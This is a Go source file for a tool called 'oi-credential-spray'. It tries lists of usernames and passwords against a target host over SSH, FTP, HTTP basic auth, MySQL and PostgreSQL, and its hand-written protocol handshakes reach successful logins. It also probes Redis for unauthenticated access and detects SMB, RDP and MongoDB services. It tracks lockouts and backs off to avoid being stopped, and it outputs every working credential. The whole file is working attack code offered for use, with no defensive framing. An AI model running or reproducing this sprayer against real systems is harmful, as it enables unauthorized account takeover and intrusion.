// main.go — oi-credential-spray
// High-concurrency credential sprayer for common network services.
// Output: NDJSON findings to stdout.
package main

import (
	"bufio"
	"context"
	"crypto/md5"  //nolint:gosec — MD5 required by MySQL/PostgreSQL wire protocols
	"crypto/sha1" //nolint:gosec — SHA1 required by MySQL native_password
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

// ─── Finding ──────────────────────────────────────────────────────────────────

// Finding is one NDJSON record emitted on stdout.
type Finding struct {
	Service  string `json:"service"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Note     string `json:"note,omitempty"`
	TS       string `json:"ts"`
}

// ─── Lockout tracker ─────────────────────────────────────────────────────────

type lockoutTracker struct {
	mu        sync.Mutex
	hitCount  map[string]int
	backedOff map[string]time.Time
}

func newLockoutTracker() *lockoutTracker {
	return &lockoutTracker{
		hitCount:  make(map[string]int),
		backedOff: make(map[string]time.Time),
	}
}

func (lt *lockoutTracker) hostKey(service, host string, port int) string {
	return fmt.Sprintf("%s:%s:%d", service, host, port)
}

// record registers a lockout/rate-limit event. Returns the imposed backoff.
func (lt *lockoutTracker) record(service, host string, port int) time.Duration {
	k := lt.hostKey(service, host, port)
	lt.mu.Lock()
	defer lt.mu.Unlock()
	lt.hitCount[k]++
	n := lt.hitCount[k]
	var backoff time.Duration
	switch {
	case n >= 5:
		backoff = 30 * time.Second
	case n >= 3:
		backoff = 10 * time.Second
	default:
		backoff = 3 * time.Second
	}
	lt.backedOff[k] = time.Now().Add(backoff)
	return backoff
}

func (lt *lockoutTracker) isBackedOff(service, host string, port int) bool {
	k := lt.hostKey(service, host, port)
	lt.mu.Lock()
	defer lt.mu.Unlock()
	until, ok := lt.backedOff[k]
	if !ok {
		return false
	}
	if time.Now().After(until) {
		delete(lt.backedOff, k)
		lt.hitCount[k] = 0
		return false
	}
	return true
}

func (lt *lockoutTracker) clear(service, host string, port int) {
	k := lt.hostKey(service, host, port)
	lt.mu.Lock()
	defer lt.mu.Unlock()
	delete(lt.hitCount, k)
	delete(lt.backedOff, k)
}

// ─── Rate limiter ─────────────────────────────────────────────────────────────

type rateLimiter struct {
	ticker *time.Ticker
}

func newRateLimiter(rps int) *rateLimiter {
	if rps <= 0 {
		rps = 10
	}
	return &rateLimiter{ticker: time.NewTicker(time.Second / time.Duration(rps))}
}

func (rl *rateLimiter) Wait(ctx context.Context) error {
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-rl.ticker.C:
		return nil
	}
}

func (rl *rateLimiter) Stop() { rl.ticker.Stop() }

// ─── Output ───────────────────────────────────────────────────────────────────

var (
	outMu  sync.Mutex
	outEnc *json.Encoder
)

func emit(f Finding) {
	f.TS = time.Now().UTC().Format(time.RFC3339)
	outMu.Lock()
	defer outMu.Unlock()
	_ = outEnc.Encode(f)
}

// ─── Crypto helpers ───────────────────────────────────────────────────────────

// mysqlNativePassword implements MySQL native_password auth hash.
func mysqlNativePassword(password string, salt []byte) []byte {
	if password == "" {
		return []byte{}
	}
	h1 := sha1.Sum([]byte(password))
	h2 := sha1.Sum(h1[:])
	combined := append(append([]byte{}, salt...), h2[:]...)
	h3 := sha1.Sum(combined)
	result := make([]byte, sha1.Size)
	for i := range h1 {
		result[i] = h1[i] ^ h3[i]
	}
	return result
}

// pgMD5Password implements PostgreSQL md5 password hashing.
func pgMD5Password(user, password string, salt []byte) string {
	h1 := md5.Sum([]byte(password + user)) //nolint:gosec
	hex1 := fmt.Sprintf("%x", h1)
	combined := append([]byte(hex1), salt...)
	h2 := md5.Sum(combined) //nolint:gosec
	return "md5" + fmt.Sprintf("%x", h2)
}

// ─── Protocol probers ─────────────────────────────────────────────────────────

func probeSSH(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("ssh", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec
		Timeout:         8 * time.Second,
	}
	d := net.Dialer{Timeout: 8 * time.Second}
	rawConn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	sshConn, chans, reqs, err := ssh.NewClientConn(rawConn, addr, config)
	if err != nil {
		msg := err.Error()
		if strings.Contains(msg, "too many auth") || strings.Contains(msg, "rate-limit") {
			lt.record("ssh", host, port)
		}
		return
	}
	client := ssh.NewClient(sshConn, chans, reqs)
	client.Close()
	lt.clear("ssh", host, port)
	emit(Finding{Service: "ssh", Host: host, Port: port, Username: user, Password: pass, Success: true})
}

func probeFTP(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("ftp", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 8 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)
	banner, _ := r.ReadString('\n')
	if !strings.HasPrefix(banner, "220") {
		return
	}
	fmt.Fprintf(conn, "USER %s\r\n", user) //nolint:errcheck
	resp, _ := r.ReadString('\n')
	if !strings.HasPrefix(resp, "331") {
		if strings.Contains(resp, "421") || strings.Contains(resp, "530") {
			lt.record("ftp", host, port)
		}
		return
	}
	fmt.Fprintf(conn, "PASS %s\r\n", pass) //nolint:errcheck
	resp, _ = r.ReadString('\n')
	if strings.HasPrefix(resp, "230") {
		lt.clear("ftp", host, port)
		emit(Finding{Service: "ftp", Host: host, Port: port, Username: user, Password: pass, Success: true})
		return
	}
	if strings.Contains(resp, "421") || strings.Contains(resp, "530 Too many") {
		lt.record("ftp", host, port)
	}
}

func probeHTTPBasic(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("http-basic", host, port) {
		return
	}
	scheme := "http"
	if port == 443 || port == 8443 {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d/", scheme, host, port)
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return
	}
	req.SetBasicAuth(user, pass)
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body) //nolint:errcheck
	switch resp.StatusCode {
	case 200, 201, 301, 302:
		lt.clear("http-basic", host, port)
		emit(Finding{Service: "http-basic", Host: host, Port: port, Username: user, Password: pass,
			Success: true, Note: fmt.Sprintf("HTTP %d", resp.StatusCode)})
	case 429:
		lt.record("http-basic", host, port)
	}
}

// probeSMB sends SMB1 Negotiate to confirm the service is alive.
// Full NTLMSSP session setup is out-of-scope; we emit a service-detected finding.
func probeSMB(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("smb", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 8 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Minimal SMB1 Negotiate Request (NetBIOS + SMB header + dialect list)
	negotiate := []byte{
		0x00, 0x00, 0x00, 0x54, // NetBIOS session message length
		0xFF, 0x53, 0x4D, 0x42, // \xffSMB
		0x72,                               // Negotiate Protocol
		0x00, 0x00, 0x00, 0x00,             // Status: success
		0x18,                               // Flags
		0x01, 0x28,                         // Flags2
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // PID High + Security Signature
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Reserved
		0xFF, 0xFF, 0xFF, 0xFE, 0x00, 0x00, // TreeID, PID, UID, MID
		0x00,       // WordCount
		0x31, 0x00, // ByteCount
		// Dialect strings
		0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00,
		0x02, 0x53, 0x4D, 0x42, 0x20, 0x32, 0x2E, 0x30, 0x30, 0x32, 0x00,
		0x02, 0x53, 0x4D, 0x42, 0x20, 0x32, 0x2E, 0x3F, 0x3F, 0x3F, 0x00,
		0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00,
	}
	if _, err := conn.Write(negotiate); err != nil {
		return
	}
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < 8 {
		return
	}
	// Check SMB signature in response
	if buf[4] == 0xFF && buf[5] == 'S' && buf[6] == 'M' && buf[7] == 'B' {
		emit(Finding{Service: "smb", Host: host, Port: port, Username: user, Password: pass,
			Success: false, Note: "smb-service-active; full NTLMSSP session-setup not implemented"})
	}
}

// probeRDP sends TPKT+X.224 Connection Request to detect an active RDP service.
func probeRDP(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("rdp", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 8 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	cookie := []byte(fmt.Sprintf("Cookie: mstshash=%s\r\n", user))
	x224Len := byte(6 + len(cookie))
	tpktTotalLen := 4 + int(x224Len) + 1
	pkt := make([]byte, 0, tpktTotalLen)
	pkt = append(pkt, 0x03, 0x00,
		byte(tpktTotalLen>>8), byte(tpktTotalLen))
	pkt = append(pkt, x224Len, 0xE0)
	pkt = append(pkt, 0x00, 0x00, 0x00, 0x00, 0x00) // dst-ref, src-ref, class
	pkt = append(pkt, cookie...)

	if _, err := conn.Write(pkt); err != nil {
		return
	}
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	if err != nil || n < 5 {
		return
	}
	if buf[0] == 0x03 && buf[4] >= 6 {
		emit(Finding{Service: "rdp", Host: host, Port: port, Username: user, Password: pass,
			Success: false, Note: "rdp-service-active; CredSSP/NLA auth not implemented"})
	}
}

// probeMySQL attempts MySQL native_password authentication.
func probeMySQL(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("mysql", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 8 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(12 * time.Second))

	// Read initial handshake
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return
	}
	payloadLen := int(hdr[0]) | int(hdr[1])<<8 | int(hdr[2])<<16
	if payloadLen <= 0 || payloadLen > 65536 {
		return
	}
	payload := make([]byte, payloadLen)
	if _, err := io.ReadFull(conn, payload); err != nil {
		return
	}
	if len(payload) == 0 || payload[0] != 0x0a {
		return // not protocol v10
	}

	// Parse server nonce: skip null-terminated version string
	offset := 1 + strings.IndexByte(string(payload[1:]), 0) + 1
	if offset+8 > len(payload) {
		return
	}
	offset += 4 // skip connection_id
	salt1 := payload[offset : offset+8]
	var salt2 []byte
	if offset+21 < len(payload) {
		salt2 = payload[offset+13 : offset+13+12]
	}
	salt := append(append([]byte{}, salt1...), salt2...)

	authResp := mysqlNativePassword(pass, salt)
	userBytes := []byte(user)

	caps := uint32(0x000FA285)
	var resp []byte
	resp = appendLE32(resp, caps)
	resp = appendLE32(resp, 16777216) // max packet size
	resp = append(resp, 0x21)        // charset utf8
	resp = append(resp, make([]byte, 23)...) // reserved
	resp = append(resp, userBytes...)
	resp = append(resp, 0x00)
	resp = append(resp, byte(len(authResp)))
	resp = append(resp, authResp...)
	resp = append(resp, []byte("mysql_native_password\x00")...)

	pkt := make([]byte, 4+len(resp))
	pkt[0] = byte(len(resp))
	pkt[1] = byte(len(resp) >> 8)
	pkt[2] = byte(len(resp) >> 16)
	pkt[3] = 1
	copy(pkt[4:], resp)

	if _, err := conn.Write(pkt); err != nil {
		return
	}

	hdr2 := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr2); err != nil {
		return
	}
	payLen2 := int(hdr2[0]) | int(hdr2[1])<<8 | int(hdr2[2])<<16
	if payLen2 <= 0 || payLen2 > 4096 {
		return
	}
	result := make([]byte, payLen2)
	if _, err := io.ReadFull(conn, result); err != nil {
		return
	}
	if len(result) > 0 && result[0] == 0x00 {
		lt.clear("mysql", host, port)
		emit(Finding{Service: "mysql", Host: host, Port: port, Username: user, Password: pass, Success: true})
		return
	}
	if len(result) >= 3 && result[0] == 0xFF {
		errCode := uint16(result[1]) | uint16(result[2])<<8
		if errCode == 1129 || errCode == 1040 {
			lt.record("mysql", host, port)
		}
	}
}

// probePostgres attempts PostgreSQL MD5 password authentication.
func probePostgres(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("postgres", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 8 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(12 * time.Second))

	params := fmt.Sprintf("user\x00%s\x00database\x00postgres\x00\x00", user)
	msgLen := 8 + len(params)
	msg := make([]byte, msgLen)
	msg[0] = byte(msgLen >> 24)
	msg[1] = byte(msgLen >> 16)
	msg[2] = byte(msgLen >> 8)
	msg[3] = byte(msgLen)
	msg[4], msg[5], msg[6], msg[7] = 0x00, 0x03, 0x00, 0x00
	copy(msg[8:], params)

	if _, err := conn.Write(msg); err != nil {
		return
	}
	typeBuf := make([]byte, 1)
	if _, err := io.ReadFull(conn, typeBuf); err != nil {
		return
	}
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return
	}
	respLen := int(lenBuf[0])<<24 | int(lenBuf[1])<<16 | int(lenBuf[2])<<8 | int(lenBuf[3])
	if respLen < 4 || respLen > 65536 {
		return
	}
	respPayload := make([]byte, respLen-4)
	if _, err := io.ReadFull(conn, respPayload); err != nil {
		return
	}

	if typeBuf[0] != 'R' || len(respPayload) < 4 {
		return
	}
	authType := int(respPayload[0])<<24 | int(respPayload[1])<<16 | int(respPayload[2])<<8 | int(respPayload[3])
	if authType == 0 {
		lt.clear("postgres", host, port)
		emit(Finding{Service: "postgres", Host: host, Port: port, Username: user, Password: pass,
			Success: true, Note: "trust-auth"})
		return
	}
	if authType != 5 || len(respPayload) < 8 {
		return
	}

	salt := respPayload[4:8]
	hash := pgMD5Password(user, pass, salt)
	pwMsg := make([]byte, 1+4+len(hash)+1)
	pwMsg[0] = 'p'
	ml := 4 + len(hash) + 1
	pwMsg[1] = byte(ml >> 24)
	pwMsg[2] = byte(ml >> 16)
	pwMsg[3] = byte(ml >> 8)
	pwMsg[4] = byte(ml)
	copy(pwMsg[5:], hash)
	pwMsg[len(pwMsg)-1] = 0

	if _, err := conn.Write(pwMsg); err != nil {
		return
	}
	t2 := make([]byte, 1)
	if _, err := io.ReadFull(conn, t2); err != nil {
		return
	}
	l2 := make([]byte, 4)
	if _, err := io.ReadFull(conn, l2); err != nil {
		return
	}
	rl2 := int(l2[0])<<24 | int(l2[1])<<16 | int(l2[2])<<8 | int(l2[3])
	if rl2 > 4 {
		discard := make([]byte, rl2-4)
		io.ReadFull(conn, discard) //nolint:errcheck
	}
	if t2[0] == 'R' {
		lt.clear("postgres", host, port)
		emit(Finding{Service: "postgres", Host: host, Port: port, Username: user, Password: pass, Success: true})
	}
}

// probeRedis checks for no-auth access (PING) and optionally tries AUTH.
func probeRedis(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("redis", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 6 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(8 * time.Second))
	r := bufio.NewReader(conn)

	if pass != "" {
		fmt.Fprintf(conn, "*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n", len(pass), pass) //nolint:errcheck
		line, _ := r.ReadString('\n')
		if strings.HasPrefix(line, "+OK") {
			lt.clear("redis", host, port)
			emit(Finding{Service: "redis", Host: host, Port: port, Username: user, Password: pass, Success: true})
			return
		}
	}

	// No-auth probe
	fmt.Fprintf(conn, "*1\r\n$4\r\nPING\r\n") //nolint:errcheck
	line, _ := r.ReadString('\n')
	if strings.HasPrefix(line, "+PONG") {
		lt.clear("redis", host, port)
		emit(Finding{Service: "redis", Host: host, Port: port, Username: "", Password: "",
			Success: true, Note: "unauthenticated-access"})
	}
}

// probeMongoDB sends OP_QUERY isMaster to detect an accessible MongoDB instance.
func probeMongoDB(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker) {
	if lt.isBackedOff("mongodb", host, port) {
		return
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: 8 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	// OP_QUERY isMaster against admin.$cmd
	isMaster := buildMongoIsMaster()
	if _, err := conn.Write(isMaster); err != nil {
		return
	}
	hdr := make([]byte, 16)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return
	}
	msgLen := int(hdr[0]) | int(hdr[1])<<8 | int(hdr[2])<<16 | int(hdr[3])<<24
	if msgLen < 36 || msgLen > 65536 {
		return
	}
	rest := make([]byte, msgLen-16)
	if _, err := io.ReadFull(conn, rest); err != nil {
		return
	}
	// MongoDB responded — check if no-auth (service accessible)
	emit(Finding{Service: "mongodb", Host: host, Port: port, Username: user, Password: pass,
		Success: false, Note: "mongodb-service-active; verify auth requirements"})
}

// buildMongoIsMaster constructs a minimal OP_QUERY isMaster packet.
func buildMongoIsMaster() []byte {
	// BSON doc: {isMaster: 1}
	bsonDoc := []byte{
		0x13, 0x00, 0x00, 0x00, // doc length = 19
		0x01,                                                       // type double
		0x69, 0x73, 0x4D, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00,     // "isMaster\0"
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x3F,            // 1.0 (double)
		0x00, // doc terminator
	}
	ns := []byte("admin.$cmd\x00")
	// MsgHeader (16) + flags(4) + ns + skip(4) + return(4) + doc
	total := 16 + 4 + len(ns) + 4 + 4 + len(bsonDoc)
	pkt := make([]byte, 0, total)
	// length
	pkt = append(pkt, byte(total), byte(total>>8), byte(total>>16), byte(total>>24))
	// requestID
	pkt = append(pkt, 0x01, 0x00, 0x00, 0x00)
	// responseTo
	pkt = append(pkt, 0x00, 0x00, 0x00, 0x00)
	// opCode OP_QUERY = 2004
	pkt = append(pkt, 0xD4, 0x07, 0x00, 0x00)
	// flags
	pkt = append(pkt, 0x00, 0x00, 0x00, 0x00)
	pkt = append(pkt, ns...)
	// numberToSkip
	pkt = append(pkt, 0x00, 0x00, 0x00, 0x00)
	// numberToReturn
	pkt = append(pkt, 0x01, 0x00, 0x00, 0x00)
	pkt = append(pkt, bsonDoc...)
	return pkt
}

// ─── Dispatcher ───────────────────────────────────────────────────────────────

type probeFunc func(ctx context.Context, host string, port int, user, pass string, lt *lockoutTracker)

type serviceSpec struct {
	defaultPort int
	probe       probeFunc
}

var serviceProbers = map[string]serviceSpec{
	"ssh":        {22, probeSSH},
	"ftp":        {21, probeFTP},
	"http-basic": {80, probeHTTPBasic},
	"smb":        {445, probeSMB},
	"rdp":        {3389, probeRDP},
	"mysql":      {3306, probeMySQL},
	"postgres":   {5432, probePostgres},
	"redis":      {6379, probeRedis},
	"mongodb":    {27017, probeMongoDB},
}

// ─── Main ─────────────────────────────────────────────────────────────────────

func main() {
	host := flag.String("host", "", "target host (required)")
	portFlag := flag.Int("port", 0, "override port (0 = service default)")
	userFile := flag.String("users", "", "username list file (one per line, required)")
	passFile := flag.String("passwords", "", "password list file (one per line, required)")
	services := flag.String("services", "ssh,ftp,http-basic,redis",
		"comma-separated services: ssh,ftp,http-basic,smb,rdp,mysql,postgres,redis,mongodb")
	rate := flag.Int("rate", 10, "max requests per second (default 10)")
	timeout := flag.Int("timeout", 60, "overall timeout seconds")
	workers := flag.Int("workers", 20, "concurrent goroutines")
	flag.Parse()

	if *host == "" {
		fmt.Fprintln(os.Stderr, "error: -host is required")
		os.Exit(1)
	}
	if *userFile == "" || *passFile == "" {
		fmt.Fprintln(os.Stderr, "error: -users and -passwords are required")
		os.Exit(1)
	}

	users, err := readLines(*userFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading users: %v\n", err)
		os.Exit(1)
	}
	passwords, err := readLines(*passFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading passwords: %v\n", err)
		os.Exit(1)
	}
	if len(users) == 0 || len(passwords) == 0 {
		fmt.Fprintln(os.Stderr, "error: user/password lists must be non-empty")
		os.Exit(1)
	}

	svcs := strings.Split(*services, ",")
	for i, s := range svcs {
		svcs[i] = strings.TrimSpace(strings.ToLower(s))
	}

	outEnc = json.NewEncoder(os.Stdout)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(*timeout)*time.Second)
	defer cancel()

	rl := newRateLimiter(*rate)
	defer rl.Stop()
	lt := newLockoutTracker()

	type job struct {
		service string
		port    int
		user    string
		pass    string
	}

	jobCh := make(chan job, *workers*4)

	var wg sync.WaitGroup
	var attempted int64
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobCh {
				if ctx.Err() != nil {
					return
				}
				if err := rl.Wait(ctx); err != nil {
					return
				}
				atomic.AddInt64(&attempted, 1)
				spec, ok := serviceProbers[j.service]
				if !ok {
					continue
				}
				spec.probe(ctx, *host, j.port, j.user, j.pass, lt)
			}
		}()
	}

	go func() {
		defer close(jobCh)
		for _, svc := range svcs {
			spec, ok := serviceProbers[svc]
			if !ok {
				log.Printf("unknown service %q — skipped", svc)
				continue
			}
			port := spec.defaultPort
			if *portFlag > 0 {
				port = *portFlag
			}
			for _, u := range users {
				for _, p := range passwords {
					select {
					case <-ctx.Done():
						return
					case jobCh <- job{svc, port, u, p}:
					}
				}
			}
		}
	}()

	wg.Wait()
	log.Printf("credential-spray complete: %d attempts against %s", atomic.LoadInt64(&attempted), *host)
}

// ─── Utilities ────────────────────────────────────────────────────────────────

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" && !strings.HasPrefix(l, "#") {
			lines = append(lines, l)
		}
	}
	return lines, sc.Err()
}

func appendLE32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}
